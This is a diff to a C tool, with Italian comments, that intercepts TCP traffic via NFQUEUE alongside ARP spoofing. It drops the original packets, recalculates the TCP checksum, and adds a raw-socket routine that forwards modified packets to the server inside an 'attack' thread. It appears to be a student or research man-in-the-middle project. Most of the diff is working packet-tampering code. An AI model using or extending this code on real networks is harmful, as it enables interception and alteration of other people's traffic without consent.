@@ -151,7 +151,6 @@ void arp_spoofing(char *ip) {
 void setup_nfq(struct nfq_handle **h, struct nfq_q_handle **qh){
 
   *h = nfq_open();
-  int fd;
 
   if(!(*h)){
     perror("Error in the NFQUEUE opening! \n");
@@ -240,7 +239,7 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
 
         if(check_data_length(application_payload, application_payload_size) == false){
           fprintf(stderr, "Data length is not correct! \n");
-          return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+          return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
         }
 
         //ALLOCAZIONE ED INIZIALIZZAZIONE DEL PACCHETTO DATA_LENGTH (VARIABILE GLOBALE) E DEI SUOI CAMPI (IP HEADER, TCP HEADER, APPLICATION DATA)
@@ -283,15 +282,10 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
         attack = true;
         pthread_cond_signal(&attack_thread_cond);
       }
-
       //sveglio il thread che modifica il pacchetto, ricalcola la checksum, lo invia al server, avvia il timer, attende risposta server, all'arrivo stoppa il timer ed inoltra il pacchetto al client
-      //modify a packet byte, send to server and start the clock
-      //alterate_packet()
-
-      //send_modified_packet()
 
       //drop packet
-      return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+      return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
     }
   } 
 
@@ -400,7 +394,22 @@ unsigned short recalculate_checksum(){
   //__be16 is like unsigned short but tells us that is in network byte order (we don't need htons())
 
   unsigned short *ptr = (unsigned short *)data_packet->tcp_header;
-  int byte_left = (int)tcp_total_len;
+  int byte_left = ((int)(data_packet->tcp_header_len));
+
+  data_packet->tcp_header->check = 0;
+  while(byte_left > 1){
+    sum += *ptr;
+    ptr++;
+    byte_left-=2;
+  }
+
+  if(byte_left == 1){ //we need padding
+    sum += (0x0000 | *(unsigned char *)ptr) & 0xFFFF;
+  }
+  printf("%#lx\n",sum);
+
+  ptr = ((unsigned short *)data_packet->data);
+  byte_left = ((int)(data_packet->data_len));
 
   while(byte_left > 1){
     sum += *ptr;
@@ -412,11 +421,16 @@ unsigned short recalculate_checksum(){
     sum += (0x0000 | *(unsigned char *)ptr) & 0xFFFF;
   }
   printf("%#lx\n",sum);
-  
 
+  
+  while (sum >> 16) {
+    sum = (sum & 0xFFFF) + (sum >> 16);
+  } 
+  
+  /*
   do{
     sum = ((sum & 0xFFFF) + (sum >> 16) & 0xFFFF);
-  }while((sum >> 16) != 0);
+  }while((sum >> 16) != 0);  */
   
   printf("Sono alla fine del ciclo! \n");
   checksum = ~sum & 0xFFFF;
@@ -427,6 +441,32 @@ unsigned short recalculate_checksum(){
 //function to send the modified packet to the server
 void send_modified_packet(){
 
+  //mettere la struct come tutti dati contigui
+  int smp_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_RAW);
+  char *raw_packet;
+
+  restore_network_default();
+  
+  unsigned int total_packet_length = data_packet->ip_header_len + data_packet->tcp_header_len + data_packet->data_len;
+  raw_packet = (char *) malloc(total_packet_length);
+
+  memcpy(raw_packet, data_packet->ip_header, data_packet->ip_header_len);
+  memcpy(raw_packet + data_packet->ip_header_len, data_packet->tcp_header, data_packet->tcp_header_len);
+  memcpy(raw_packet + data_packet->ip_header_len + data_packet->tcp_header_len, data_packet->data, data_packet->data_len);
+
+  struct sockaddr_in server_addr;
+  server_addr.sin_family = AF_INET;
+  server_addr.sin_addr.s_addr = data_packet->ip_header->daddr;
+  server_addr.sin_port = data_packet->tcp_header->dest;
+
+  printf("ho creato l'indirizzo ora spedisco il pacchetto al server! \n");
+
+  sendto(smp_fd, raw_packet, total_packet_length,0, (struct sockaddr *)&server_addr, sizeof(server_addr));
+
+  printf("pacchetto mandato al server! \n");
+
+  free(raw_packet);
+  close(smp_fd);
 }
 
 //function to start the clock timer
@@ -469,11 +509,13 @@ void *do_attack_thread(void *arg){
 
     checksum = recalculate_checksum();
 
+    data_packet->tcp_header->check = checksum;
+
     printf("Checksum: %04x \n", checksum);
-  
-    //recalculate_checksum();
-    //data_packet->ip_header->checksum = new_checksum
-    //send_modified_packet();
+
+   
+    send_modified_packet();
+
     //start_timer(); (forse chiamata subito dentro send_modified_packet)
     //wait for response
     //stop_timer();
